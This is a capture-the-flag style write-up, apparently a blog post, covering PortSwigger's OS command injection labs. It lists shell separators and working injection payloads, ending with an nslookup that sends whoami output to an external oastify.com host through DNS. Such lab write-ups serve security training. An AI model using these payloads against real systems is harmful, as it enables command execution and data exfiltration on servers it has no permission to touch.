---
layout: single
title: OS Command Injection - PortSwigger
excerpt: "All OS Command Injection labs of PortSwigger."
date: 2025-09-24
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - OS Command Injection
---


## Identification

```
 &&
 &
 ||
 |
 ;
 `
 '
 "
 0x0a
 \n
```

## Inyección de comandos, caso simple || OS command injection, simple case

![](/img2/Pasted%20image%2020250924172159.png)

> By corrupting the query, we see that we are within the context of command execution.

![](/img2/Pasted%20image%2020250924172249.png)

> We concatenate our command using a ;. The underlying command would look like this:

```bash
sh -c bash /home/peter-GPnOhF/stockreport.sh 1 1;whoami
```

- Injection 

```bash
;whoami
```
## Inyección ciega con retrasos temporales || Blind OS command injection with time delays

![](/img2/Pasted%20image%2020250924180005.png)

> By using backticks, we execute a command to check if it is vulnerable.

- Injection

```bash
`sleep 10`
```

## Inyección ciega con redirección de salida || Blind OS command injection with output redirection

![](/img2/Pasted%20image%2020250924183354.png)

> First, we detect command injection using a sleep.

![](/img2/Pasted%20image%2020250924183137.png)

![](/img2/Pasted%20image%2020250924183152.png)

> We send the output to a file inside the images directory `/var/www/images/`.

- Injection

```bash
`whoami` >> /var/www/images/test.txt
```

## Inyección ciega con interacción OOB || Blind OS command injection with out-of-band interaction

![](/img2/Pasted%20image%2020250924184546.png)

![](/img2/Pasted%20image%2020250924184559.png)

> In this case, we cannot force a delay in the response; however, we can detect the vulnerability via a DNS request.

- Injection

```bash
`nslookup 6ahsp7n9bzragcunrr7b18q6gxmpafy4.oastify.com`
```

## Inyección ciega con exfiltración vía interacción OOB || Blind OS command injection with out-of-band data exfiltration

![](/img2/Pasted%20image%2020250924184849.png)

![](/img2/Pasted%20image%2020250924184859.png)

> Just like the previous lab, we detect the vulnerability through a DNS request.

![](/img2/Pasted%20image%2020250924185022.png)

![](/img2/Pasted%20image%2020250924185053.png)

> Mediante el uso del operador $() de bash, hacemos una petición a nuestro domino con el output del comando whoami como subdominio.

- Injección

```bash
`nslookup $(whoami).c5iykdif65mgbiptmx2hwelcb3hw5mtb.oastify.com`
```